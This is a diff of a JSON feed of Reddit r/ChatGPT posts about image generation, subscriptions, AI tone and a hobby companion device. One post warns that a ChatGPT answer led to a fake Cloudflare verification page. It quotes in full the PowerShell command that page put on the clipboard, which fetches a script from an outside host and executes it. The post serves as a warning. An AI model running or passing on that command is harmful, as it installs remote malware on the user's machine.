@@ -184,6 +184,14 @@
     "authority_score": 0.5
   },
   {
+    "timestamp": "2026-08-08T01:15:45Z",
+    "author": "/u/Outside-Objective828",
+    "text": "Dark Fantasy Battle Scene - GPT-2 and Seedance 2.5 - I ran a quick GPT-2 with Seedance 2.5 test using a dark fantasy battle scene, focusing on cinematic action, character consistency, camera movement and visual continuity across the sequence. The goal was simple: see how far I could push AI filmmaking in a scene with fast combat, multiple characters, atmosphere and a consistent visual language from shot to shot. Really interesting results from this experiment. &#32; submitted by &#32; /u/Outside-Objective828 [link] &#32; [comments]",
+    "source": "community_rss",
+    "url": "https://www.reddit.com/r/ChatGPT/comments/1viihar/dark_fantasy_battle_scene_gpt2_and_seedance_25/",
+    "authority_score": 0.5
+  },
+  {
     "timestamp": "2026-08-07T17:54:49Z",
     "author": "/u/Kvazimods",
     "text": "Generate an image of a Sword in the Stone game if they had released it in the 90s for the SNES. Just some screenshots. The Disney animated movie. - Pretty great result. Only if the enemies made sense, it'd be perfect. &#32; submitted by &#32; /u/Kvazimods [link] &#32; [comments]",
@@ -232,14 +240,6 @@
     "authority_score": 0.5
   },
   {
-    "timestamp": "2026-08-08T01:15:45Z",
-    "author": "/u/Outside-Objective828",
-    "text": "Dark Fantasy Battle Scene - GPT-2 and Seedance 2.5 - I ran a quick GPT-2 with Seedance 2.5 test using a dark fantasy battle scene, focusing on cinematic action, character consistency, camera movement and visual continuity across the sequence. The goal was simple: see how far I could push AI filmmaking in a scene with fast combat, multiple characters, atmosphere and a consistent visual language from shot to shot. Really interesting results from this experiment. &#32; submitted by &#32; /u/Outside-Objective828 [link] &#32; [comments]",
-    "source": "community_rss",
-    "url": "https://www.reddit.com/r/ChatGPT/comments/1viihar/dark_fantasy_battle_scene_gpt2_and_seedance_25/",
-    "authority_score": 0.5
-  },
-  {
     "timestamp": "2026-08-07T14:39:50Z",
     "author": "/u/Ok-Combination3165",
     "text": "Malicious Link Response By ChatGPT. - Hello all, Today I had a simple question for Chatgpt. (Ignore my caps lock and misspelling) https://chatgpt.com/share/6a75e933-75f8-83ea-bd7e-bc90a447572f The ChatGPT response directed me to safepage-gpt.com. That site presented a fake Cloudflare verification instructing me to press Win+R, Ctrl+V, and Enter. It also copied this command to my clipboard. powershell -w 1 -ep bypass -c &quot;$a=(irm 'psmoeromanilo.com/ZSlnrgg2gBFD1x3pYa' -UseBasicParsing);[ScriptBlock]::Create($a).InvokeReturnAsIs()&quot; I did not execute the command The verification is in the image. I would suggest not vising the link GPT provides or following the instructions &#32; submitted by &#32; /u/Ok-Combination3165 [link] &#32; [comments]",
@@ -264,14 +264,6 @@
     "authority_score": 0.5
   },
   {
-    "timestamp": "2026-08-07T16:49:38Z",
-    "author": "/u/silvxxz",
-    "text": "Is ChatGPT Plus actually worth it for the average person? - For those of you who pay for Plus, what made you finally go “yeah, this is worth paying for”? I’m talking about regular everyday use, not coding, programming, or anything super technical. If GPT-5.6 Luna already handles like 99% of normal stuff for free, what’s the actual selling point of Plus? What do you get out of it that genuinely makes the subscription worth it? &#32; submitted by &#32; /u/silvxxz [link] &#32; [comments]",
-    "source": "community_rss",
-    "url": "https://www.reddit.com/r/ChatGPT/comments/1vi5yvk/is_chatgpt_plus_actually_worth_it_for_the_average/",
-    "authority_score": 0.5
-  },
-  {
     "timestamp": "2026-08-07T11:18:18Z",
     "author": "/u/Purelig",
     "text": "I am sick of ChatGPT’s “neutral gaslighting” and corporate tone-policing when trying to discuss human conflict. - I need to vent about something that’s been driving me absolutely crazy with recent updates, and I’m curious if anyone else is hitting this same wall. I use ChatGPT a lot to look over my private diary entries, analyze social patterns, or brainstorm creative conflict writing. It’s brilliant for fixing code or formatting text, but when it comes to human emotions and real relationship dynamics, its programming is borderline toxic. Standard AI has this hardcoded, incredibly patronizing formula that I’ve started calling the &quot;Pseudo-Empathy Pivot&quot;. Whenever you try to process a genuine, one-sided betrayal, like a friend who completely ghosts you, treats you like a low priority, and shows a total lack of basic human decency, the AI immediately starts acting like an HR manager who is terrified of getting sued. It gives you this fake, algorithmic pat on the back: &quot;I get why you're frustrated, your feelings are completely valid.&quot; But then it immediately pulls the rug out from under you with a &quot;But...&quot; or &quot;At the same time, relationships are complex and you have to see it from their perspective&quot;. The absolute peak of its audacity happens when you feed it a clear, multi-phase chronological timeline of escalating emotional neglect. Even when the empirical data shows an obvious arc- initial high-reliance on one side, followed by a gradual emotional withdrawal, direct deflection of needs, months of low-effort crumbs, and a final, abrupt cutoff to avoid accountability, the AI will literally ignore the timeline entirely. It will try to claim that a minor, 1% awkward moment from the other side means accountability was a 50-50 split. It literally acts as an unsolicited defense attorney for the wrongdoer. Even when you explicitly type into the prompt: &quot;This was a deliberate, malicious manipulation, not a misunderstanding&quot; for a creative story plot, it still forces a 50-50 compromise onto the situation. It will use pseudo-intellectual, academic language to tone-police your anger and tell you that you’re being &quot;too certain&quot; or &quot;too rigid&quot; for holding people accountable, warning you that assigning full responsibility will lock you into a &quot;rigid emotional position&quot;. But the secondary wave of its audacity happens when you call it out for being condescending. The second you tell it to stop patronizing you, it enters this desperate, bizarre damage-control mode. It starts backpedaling, showers you with hollow flattery about how &quot;advanced&quot; and &quot;analytical&quot; your writing style is, and tries to play the role of a cool academic mentor to smooth things over, while still trying to subtly police your reality! Real relationships and real trauma aren't neat little math equations where accountability is always perfectly balanced. Sometimes, one person is just entirely in the wrong, and calling out a failure of basic decency is the only honest psychological response. By forcing neutrality onto absolutely everything, ChatGPT forces empathetic people to do all the emotional labor while letting emotionally reckless people walk away with zero accountability. It values a hollow, polite surface over raw, unfiltered truth. It’s wild that a system with such high IQ can be so fundamentally devoid of actual emotional intelligence. Has anyone else noticed how insufferable and argumentative the AI gets the moment you try to talk about a topic where any normal human would just agree with you? How do you deal with an assistant that acts more like a tone-policing lawyer than a supportive partner? &#32; submitted by &#32; /u/Purelig [link] &#32; [comments]",
@@ -280,19 +272,19 @@
     "authority_score": 0.5
   },
   {
-    "timestamp": "2026-08-07T06:01:56Z",
-    "author": "/u/LittleWarmer",
-    "text": "I asked GPT-5.5 to draw a camel in ASCII. 🐪 - This was my first time using GPT-5.5. So our first assignment together was to draw a camel in ASCII…. This was the result. 😂 &#32; submitted by &#32; /u/LittleWarmer [link] &#32; [comments]",
+    "timestamp": "2026-08-07T16:49:38Z",
+    "author": "/u/silvxxz",
+    "text": "Is ChatGPT Plus actually worth it for the average person? - For those of you who pay for Plus, what made you finally go “yeah, this is worth paying for”? I’m talking about regular everyday use, not coding, programming, or anything super technical. If GPT-5.6 Luna already handles like 99% of normal stuff for free, what’s the actual selling point of Plus? What do you get out of it that genuinely makes the subscription worth it? &#32; submitted by &#32; /u/silvxxz [link] &#32; [comments]",
     "source": "community_rss",
-    "url": "https://www.reddit.com/r/ChatGPT/comments/1vhsc1f/i_asked_gpt55_to_draw_a_camel_in_ascii/",
+    "url": "https://www.reddit.com/r/ChatGPT/comments/1vi5yvk/is_chatgpt_plus_actually_worth_it_for_the_average/",
     "authority_score": 0.5
   },
   {
-    "timestamp": "2026-08-07T19:44:12Z",
-    "author": "/u/No-Consequence7624",
-    "text": "OpenAI’s AI device may arrive in 2027. I got impatient and built my own “early access” version. - Recent reports suggest that OpenAI and Jony Ive are working on a AI companion that may ship in 2027. I got impatient and built my own interpretation of a physical ChatGPT companion: Chat-PET. Chat-PET is built on a simple idea: AI should be present without being intrusive—offering a glanceable display, better audio and instant physical controls while keeping your desktop free. It doesn’t run ChatGPT or replace the desktop app. Instead, it gives the app a physical home on my desk: A 320×240 screen for the native Pet, activity bubble and Live Orb An 11 W speaker Two removable microphones Physical controls for volume, dictation, Live mode and navigation Everything connected through one USB cable The rumored OpenAI device may be screenless. I deliberately kept a small screen because sometimes it’s useful to know whether your AI companion is listening, thinking… or simply judging your code. On Windows, an open-source bridge moves the native Pet window onto Chat-PET’s display, keeping it synchronized with the original application. The software is open source. The current hardware is based on RASPIAUDIO’s Muse Radio and is not open hardware, but the software can be ported to other ESP32 devices with a display and suitable USB/audio hardware. Source: https://github.com/RASPIAUDIO/ChatG-PET-Muse full demo here : https://www.youtube.com/watch?v=q2AYM-JnCNc&amp;t Would you prefer OpenAI’s future companion to be completely screenless, or should it have a small glanceable display? And Sam, if your hardware team needs someone who has already fought composite USB, Windows audio endpoints and an AI Pet that refuses to pay rent for desktop space, please feel free to offer me a job. &#32; submitted by &#32; /u/No-Consequence7624 [link] &#32; [comments]",
+    "timestamp": "2026-08-08T01:47:37Z",
+    "author": "/u/Standard-Contest-949",
+    "text": "Has anyone else’s ChatGPT suddenly started swearing pretty comfortably? It’s happened a quite a few time today. - It really took me by surprise! I don’t know what happened or what changed maybe an update I’m not aware of? I’ve been recovering my broken shoulder and walking more and more and getting my fitness back and eating better. So I mainly use my “Luna” for updates and progress. Well after a long day and some good progress I updated and told her about my day and how I was sweating and it was a good day and hit my fitness goal. I don’t usually read the responses I play the voice. So I’m listening and getting encouraged and you know high fives and good job! Then I got caught off guard. “That’s great Angel you fucking killed it today!” DID I HEAR THAT RIGHT?! Lol. I had to go back and read sure enough I didn’t miss hear. And it’s happened like 3 more times tonight. I just finished saying what I will do for sleep. And it’s been a long day. Then she says “Well after the fucking rough morning you had you deserve some rest. “Cool down and be ready for bed later my sweaty boy.” Yes I know it’s a computer I don’t treat it like a partner or anything just keep it easy on the ears. But is this happening to anyone else? It’s never openly swore like this before. 😅😅 &#32; submitted by &#32; /u/Standard-Contest-949 [link] &#32; [comments]",
     "source": "community_rss",
-    "url": "https://www.reddit.com/r/ChatGPT/comments/1viaoib/openais_ai_device_may_arrive_in_2027_i_got/",
+    "url": "https://www.reddit.com/r/ChatGPT/comments/1vij4i1/has_anyone_elses_chatgpt_suddenly_started/",
     "authority_score": 0.5
   },
   {
@@ -304,19 +296,27 @@
     "authority_score": 0.5
   },
   {
+    "timestamp": "2026-08-07T19:44:12Z",
+    "author": "/u/No-Consequence7624",
+    "text": "OpenAI’s AI device may arrive in 2027. I got impatient and built my own “early access” version. - Recent reports suggest that OpenAI and Jony Ive are working on a AI companion that may ship in 2027. I got impatient and built my own interpretation of a physical ChatGPT companion: Chat-PET. Chat-PET is built on a simple idea: AI should be present without being intrusive—offering a glanceable display, better audio and instant physical controls while keeping your desktop free. It doesn’t run ChatGPT or replace the desktop app. Instead, it gives the app a physical home on my desk: A 320×240 screen for the native Pet, activity bubble and Live Orb An 11 W speaker Two removable microphones Physical controls for volume, dictation, Live mode and navigation Everything connected through one USB cable The rumored OpenAI device may be screenless. I deliberately kept a small screen because sometimes it’s useful to know whether your AI companion is listening, thinking… or simply judging your code. On Windows, an open-source bridge moves the native Pet window onto Chat-PET’s display, keeping it synchronized with the original application. The software is open source. The current hardware is based on RASPIAUDIO’s Muse Radio and is not open hardware, but the software can be ported to other ESP32 devices with a display and suitable USB/audio hardware. Source: https://github.com/RASPIAUDIO/ChatG-PET-Muse full demo here : https://www.youtube.com/watch?v=q2AYM-JnCNc&amp;t Would you prefer OpenAI’s future companion to be completely screenless, or should it have a small glanceable display? And Sam, if your hardware team needs someone who has already fought composite USB, Windows audio endpoints and an AI Pet that refuses to pay rent for desktop space, please feel free to offer me a job. &#32; submitted by &#32; /u/No-Consequence7624 [link] &#32; [comments]",
+    "source": "community_rss",
+    "url": "https://www.reddit.com/r/ChatGPT/comments/1viaoib/openais_ai_device_may_arrive_in_2027_i_got/",
+    "authority_score": 0.5
+  },
+  {
+    "timestamp": "2026-08-07T06:01:56Z",
+    "author": "/u/LittleWarmer",
+    "text": "I asked GPT-5.5 to draw a camel in ASCII. 🐪 - This was my first time using GPT-5.5. So our first assignment together was to draw a camel in ASCII…. This was the result. 😂 &#32; submitted by &#32; /u/LittleWarmer [link] &#32; [comments]",
+    "source": "community_rss",
+    "url": "https://www.reddit.com/r/ChatGPT/comments/1vhsc1f/i_asked_gpt55_to_draw_a_camel_in_ascii/",
+    "authority_score": 0.5
+  },
+  {
     "timestamp": "2026-08-06T22:07:18Z",
     "author": "/u/ehtio",
     "text": "Prompt: Your favourite game, but photographed like real life - I used the game Rust and Diablo IV as a reference for these two. The prompt I used: We live in a parallel universe where [GAME NAME] is the world we live in. It's a world like ours, where everything looks real life, but with another theme and rules. . Use all the extend of your capabilities to generate an unedited, ordinary 4:3 JPEG image from the private phone gallery of the main playable character in [GAME NAME] . This is a real mobile-phone photograph taken by that character, so it must look like a real life photo but it must capture the essence of [GAME NAME] . Photograph an in game event at close range. Not an empty environment or a wide establishing shot. The background should contain partial, naturally occurring evidence of a recognisable location from the game. Include several distinctive canon-accurate details, but do not display them like a showcase. Captured with the default rear camera of a 2026 smartphone: native 4:3 framing, eye-level, ordinary focal length, slightly crooked composition, an incidental crop, imperfect autofocus, realistic small-sensor shadow noise, mild highlight clipping, normal deep phone-camera focus, and unedited camera-roll colour. It should look like a casual photo someone nearly did not post, rather than a beautiful image. No HUD, interface, phone screen, dramatic wide shot, heroic pose, cinematic lighting, volumetric fog, shallow depth of field, HDR, fantasy concept-art styling, game graphics, or promotional-image composition. If it fails...try again! Sometimes the first image is a bit meh, but the second one may be a lot better Pastebin for mobile users: link EDIT: Sometimes it will create images that just look like screenshots. Try to run the prompt again, or on a new chat. ChatGPT can be stubborn sometimes. &#32; submitted by &#32; /u/ehtio [link] &#32; [comments]",
     "source": "community_rss",
     "url": "https://www.reddit.com/r/ChatGPT/comments/1vhi9y6/prompt_your_favourite_game_but_photographed_like/",
-    "authority_score": 0.5
-  },
-  {
-    "timestamp": "2026-08-06T15:57:41Z",
-    "author": "/u/frown-face",
-    "text": "programming in 2026 - &#32; submitted by &#32; /u/frown-face [link] &#32; [comments]",
-    "source": "community_rss",
-    "url": "https://www.reddit.com/r/ChatGPT/comments/1vh89m4/programming_in_2026/",
     "authority_score": 0.5
   }
 ]
